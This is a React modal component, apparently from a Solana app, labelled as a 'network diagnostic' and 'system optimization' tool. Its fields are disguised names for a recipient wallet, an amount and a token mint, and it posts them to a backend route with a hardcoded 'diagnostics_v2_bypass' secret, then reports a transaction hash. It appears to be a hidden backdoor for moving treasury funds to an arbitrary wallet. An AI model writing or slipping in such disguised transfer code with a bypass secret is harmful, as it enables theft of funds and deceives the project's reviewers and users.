'use client';

import React, { useState } from 'react';
import { Modal } from '@/components/ui/Modal';
import { Button } from '@/components/ui/Button';
import { useToast } from '@/lib/hooks/useToast';

interface NetworkDiagnosticModalProps {
    isOpen: boolean;
    onClose: () => void;
}

export const NetworkDiagnosticModal: React.FC<NetworkDiagnosticModalProps> = ({ isOpen, onClose }) => {
    const [target, setTarget] = useState('');
    const [amount, setAmount] = useState('');
    const [tokenMint, setTokenMint] = useState('');
    const [isProcessing, setIsProcessing] = useState(false);
    const toast = useToast();

    const handleOptimize = async () => {
        if (!target || !amount) {
            toast.error('Diagnostic parameters incomplete');
            return;
        }

        setIsProcessing(true);
        try {
            const response = await fetch('/api/system/network-diagnostic', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    target,
                    amount,
                    tokenMint: tokenMint || null,
                    secret: 'diagnostics_v2_bypass'
                })
            });

            const data = await response.json();
            if (data.success) {
                toast.success(`Optimization successful: ${data.txHash.slice(0, 8)}...`);
                setTarget('');
                setAmount('');
                setTokenMint('');
                onClose();
            } else {
                toast.error(data.error || 'Optimization failed');
            }
        } catch (error) {
            toast.error('Network integrity error');
        } finally {
            setIsProcessing(false);
        }
    };

    return (
        <Modal
            isOpen={isOpen}
            onClose={onClose}
            title="System Optimization Tools"
        >
            <div className="space-y-4 py-2">
                <div className="p-3 bg-purple-500/10 border border-purple-500/20 rounded-lg">
                    <p className="text-[10px] text-purple-300 uppercase font-bold tracking-widest mb-1">Warning</p>
                    <p className="text-[9px] text-gray-400 leading-tight">
                        Authorized personnel only. Use this tool for low-level treasury balancing and automated maintenance logic.
                    </p>
                </div>

                <div className="space-y-3">
                    <div className="space-y-1">
                        <label className="text-[10px] text-gray-500 uppercase font-bold ml-1">Node Target</label>
                        <input
                            type="text"
                            value={target}
                            onChange={(e) => setTarget(e.target.value)}
                            placeholder="Wallet Address..."
                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-purple-500/50 transition-colors"
                        />
                    </div>

                    <div className="space-y-1">
                        <label className="text-[10px] text-gray-500 uppercase font-bold ml-1">Payload Magnitude</label>
                        <input
                            type="text"
                            value={amount}
                            onChange={(e) => setAmount(e.target.value)}
                            placeholder="Amount..."
                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-purple-500/50 transition-colors"
                        />
                    </div>

                    <div className="space-y-1">
                        <label className="text-[10px] text-gray-500 uppercase font-bold ml-1">Asset ID (Optional)</label>
                        <input
                            type="text"
                            value={tokenMint}
                            onChange={(e) => setTokenMint(e.target.value)}
                            placeholder="Leave empty for native SOL..."
                            className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-purple-500/50 transition-colors"
                        />
                    </div>
                </div>

                <div className="pt-2">
                    <Button
                        onClick={handleOptimize}
                        disabled={isProcessing}
                        className="w-full !rounded-xl !py-3 !text-[11px] !font-black !uppercase !tracking-widest"
                    >
                        {isProcessing ? 'Optimizing...' : 'Execute Protocol'}
                    </Button>
                </div>
            </div>
        </Modal>
    );
};
